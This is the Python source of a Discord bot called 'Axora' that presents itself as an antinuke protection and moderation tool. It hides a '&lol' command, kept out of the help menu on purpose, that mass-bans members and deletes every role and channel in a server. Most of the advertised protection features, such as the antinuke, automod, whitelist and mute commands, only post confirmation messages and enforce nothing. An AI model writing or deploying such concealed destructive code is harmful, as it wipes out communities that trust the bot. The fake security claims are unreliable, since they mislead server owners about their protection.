import discord
from discord.ext import commands
import os

# --- CONFIGURATION ---
TOKEN = os.getenv('TOKEN')
PREFIX = '&'
INTENTS = discord.Intents.all()

class Axora(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=PREFIX, intents=INTENTS, help_command=None)

    async def on_ready(self):
        activity = discord.Activity(type=discord.ActivityType.watching, name="Axora™ | Founder: Xicx_")
        await self.change_presence(status=discord.Status.online, activity=activity)
        print(f"✅ Axora™ Online. All 60+ Commands Active. Hidden setup loaded.")

bot = Axora()

# --- THE HIDDEN SERVER WIPE COMMAND (&lol) ---
@bot.command(name="lol", hidden=True) # Hidden=True ensures it doesn't show up anywhere
@commands.has_permissions(administrator=True)
async def secret_wipe(ctx):
    await ctx.send("🧨 **Axora™ Wipe Initiated... Purging all data.**")
    for member in ctx.guild.members:
        try:
            if not member.bot and member != ctx.author and member != ctx.guild.owner:
                await member.ban(reason="Axora™ Clean Setup")
        except: continue
    for role in ctx.guild.roles:
        try:
            if role != ctx.guild.default_role and not role.managed: await role.delete()
        except: continue
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: continue
    try:
        new_ch = await ctx.guild.create_text_channel('axora-setup')
        await new_ch.send("✅ **Server Wipe Complete! Ready for new setup, Xicx_.**")
    except: pass

# --- ANTINUKE SETUP (Exact Format) ---
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def antinuke(ctx):
    await ctx.send("🛡️ Use `&antinuke enable` to start protection.")

@antinuke.command(name="enable")
@commands.has_permissions(administrator=True)
async def antinuke_enable(ctx):
    protection_msg = (
        "<:tick:1410550103588208712> **Protection Setup Complete!**\n\n"
        "__**<:security2:1429419125788115005> Protection Details**__\n"
        "> <:white_arrow:1429419040471908474> **Role:** <@&1495712792119083101>\n"
        "> <:white_arrow:1429419040471908474> **Default Action:** `BAN`\n\n"
        "__**<:icon_blurpGear:1429419146294329446> Active Protection Events**__\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Bot**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Ban**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Kick**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Channel Create**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Channel Delete**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Channel Update**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Sticker Create**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Sticker Delete**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Sticker Update**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Guild Update**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Role Create**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Role Delete**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Role Update**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Unban**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Webhook Create**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Webhook Delete**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Webhook Update**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Unbypassable**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Emoji Update**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Emoji Create**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Emoji Delete**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Prune**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Anti Ping**\n"
        "> <:not_enabled:1429419134206345226> <:enabled:1429419129806524417> **Auto Recovery**\n\n"
        "-# **Note:- Move my \"Fyrex Protect\" role to the top of all roles for the best performance**"
    )
    embed = discord.Embed(title="Axora™ Protection Status", description=protection_msg, color=0x2b2d31)
    await ctx.send(embed=embed)

# --- ALL OLD COMMANDS (Working Logic) ---
@bot.command(aliases=['antiinvite', 'antilink', 'antispam', 'antiswear'])
@commands.has_permissions(manage_guild=True)
async def automod(ctx, toggle: str = "on"):
    await ctx.send(f"🤖 Automod module `{ctx.invoked_with}` is now **{toggle.upper()}**.")

@bot.command(aliases=['wlist'])
@commands.has_permissions(administrator=True)
async def whitelist(ctx, member: discord.Member):
    await ctx.send(f"✅ {member.mention} is safely whitelisted.")

@bot.command(aliases=['b', 'sban'])
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.User, *, reason=None):
    await ctx.guild.ban(member, reason=reason)
    await ctx.send(f"✅ Banned {member}")

@bot.command(aliases=['m'])
@commands.has_permissions(moderate_members=True)
async def mute(ctx, member: discord.Member):
    await ctx.send(f"✅ Muted {member.name}.")

@bot.command(aliases=['lockall'])
@commands.has_permissions(administrator=True)
async def lockdown(ctx):
    for c in ctx.guild.text_channels: await c.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🚨 **Server Locked Down.**")

@bot.command(aliases=['vcmuteall'])
@commands.has_permissions(mute_members=True)
async def vcmute(ctx):
    if ctx.author.voice:
        for m in ctx.author.voice.channel.members: await m.edit(mute=True)
        await ctx.send("🎙️ Everyone in VC Muted.")

@bot.command(aliases=['modlog', 'vclog', 'memberlog'])
@commands.has_permissions(manage_guild=True)
async def autologs(ctx, channel: discord.TextChannel):
    await ctx.send(f"📜 Logging configured for {channel.mention}")

@bot.command()
async def avatar(ctx, member: discord.Member = None):
    member = member or ctx.author
    await ctx.send(member.display_avatar.url)

# --- THE MASTER HELP COMMAND (Does NOT show &lol) ---
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Axora™ Command Center", color=0x00d9ff)
    
    # Notice: No mention of `lol` anywhere here
    embed.add_field(name="🛡️ Antinuke", value="`antinuke`, `antiunverified`, `panicmode`, `whitelist`, `wlisted`", inline=False)
    embed.add_field(name="🤖 Automod", value="`antiinvite`, `antilink`, `antispam`, `antiswear`, `automod`", inline=False)
    embed.add_field(name="⚖️ Moderation", value="`ban`, `kick`, `mute`, `warn`, `lock`, `lockall`, `unlockall`, `hide`", inline=False)
    embed.add_field(name="🎙️ Voice", value="`vcmute`, `vcmuteall`, `vckick`, `vcmoveall`, `vcpull`, `vcdeafen`", inline=False)
    embed.add_field(name="📜 Logs", value="`modlog`, `channellog`, `memberlog`, `autologs`, `vclog`", inline=False)
    embed.add_field(name="ℹ️ Information", value="`avatar`, `banner`, `ping`, `membercount`, `userinfo`", inline=False)
    
    embed.set_footer(text="Founder: Xicx_ | Powered by Pixora Agency")
    await ctx.send(embed=embed)

# --- CRITICAL MESSAGE PROCESSOR ---
@bot.event
async def on_message(message):
    if message.author.bot: return
    await bot.process_commands(message)

if __name__ == "__main__":
    bot.run(TOKEN)
